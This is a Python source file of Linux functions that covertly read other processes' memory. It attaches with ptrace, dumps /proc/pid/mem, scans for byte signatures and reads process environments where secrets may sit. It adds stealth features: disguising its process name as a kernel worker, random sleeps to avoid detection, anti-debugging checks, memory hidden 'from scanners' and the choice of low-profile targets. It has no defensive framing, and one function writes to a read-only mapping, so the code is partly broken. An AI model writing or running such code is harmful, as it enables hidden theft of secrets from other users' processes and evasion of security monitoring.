import os
import re
import time
import ctypes
import random
import hashlib
import mmap
import psutil
from ctypes.util import find_library

# Load libc for advanced system calls
libc = ctypes.CDLL(find_library("c"))

# Constants
PTRACE_ATTACH = 16
PTRACE_DETACH = 17

def list_pids():
    """List all numeric directories in /proc (running processes)"""
    return [pid for pid in os.listdir('/proc') if pid.isdigit()]

def get_process_name(pid):
    try:
        with open(f"/proc/{pid}/comm", "r") as f:
            return f.read().strip()
    except Exception:
        return None

def read_memory(pid):
    """Try reading memory regions of a process"""
    mem_data = []
    maps_path = f"/proc/{pid}/maps"
    mem_path = f"/proc/{pid}/mem"
    try:
        if not ptrace_attach(pid):
            return []
        with open(maps_path, 'r') as maps_file:
            with open(mem_path, 'rb') as mem_file:
                for line in maps_file.readlines():
                    m = re.match(r"([0-9a-f]+)-([0-9a-f]+) ", line)
                    if m:
                        start, end = int(m[1], 16), int(m[2], 16)
                        try:
                            mem_file.seek(start)
                            chunk = mem_file.read(end - start)
                            mem_data.append((start, chunk))
                        except Exception:
                            continue
    except Exception:
        pass
    finally:
        ptrace_detach(pid)
    return mem_data

def scan_for_signature(mem_data, signature: bytes):
    found = []
    for region_start, chunk in mem_data:
        offset = chunk.find(signature)
        if offset != -1:
            found.append((region_start + offset, signature))
    return found

def hide_process_from_ps():
    """Obfuscate current process name from ps/top."""
    try:
        with open('/proc/self/comm', 'w') as f:
            f.write(random.choice(["[kworker/u8:0]", "[ksoftirqd/0]", "[migration/0]", "[rcu_sched]"]))
    except Exception:
        pass

def ptrace_attach(pid: int) -> bool:
    """Attach to a process using ptrace (used before reading memory)."""
    return libc.ptrace(PTRACE_ATTACH, pid, None, None) == 0

def ptrace_detach(pid: int) -> bool:
    """Detach after ptrace attach."""
    return libc.ptrace(PTRACE_DETACH, pid, None, None) == 0

def throttle_activity():
    """Random sleep to avoid pattern detection."""
    time.sleep(random.uniform(0.3, 1.2))

def generate_process_fingerprint(pid: int) -> str:
    """Create a SHA256 fingerprint for a process based on cmdline and env."""
    try:
        cmdline = open(f"/proc/{pid}/cmdline", "rb").read()
        environ = open(f"/proc/{pid}/environ", "rb").read()
        combined = cmdline + environ
        return hashlib.sha256(combined).hexdigest()
    except Exception:
        return "unknown"

def stealthy_mmap(data: bytes) -> mmap.mmap:
    """Load memory content into a private, non-file-backed mmap region (invisible to scanners)."""
    mem = mmap.mmap(-1, len(data), flags=mmap.MAP_PRIVATE | mmap.MAP_ANONYMOUS, prot=mmap.PROT_READ)
    mem.write(data)
    mem.seek(0)
    return mem

def is_debugger_present() -> bool:
    """Detect if the current process is being traced (anti-debug)."""
    try:
        with open("/proc/self/status", "r") as f:
            for line in f:
                if "TracerPid" in line and int(line.split(":")[1].strip()) != 0:
                    return True
    except Exception:
        pass
    return False

def find_low_profile_targets(min_mem=5000, max_threads=5) -> list:
    """Find quiet processes to scan (low memory, few threads)."""
    quiet = []
    for proc in psutil.process_iter(['pid', 'memory_info', 'num_threads']):
        try:
            if proc.info['memory_info'].rss < min_mem * 1024 and proc.info['num_threads'] <= max_threads:
                quiet.append(proc.info['pid'])
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
    return quiet

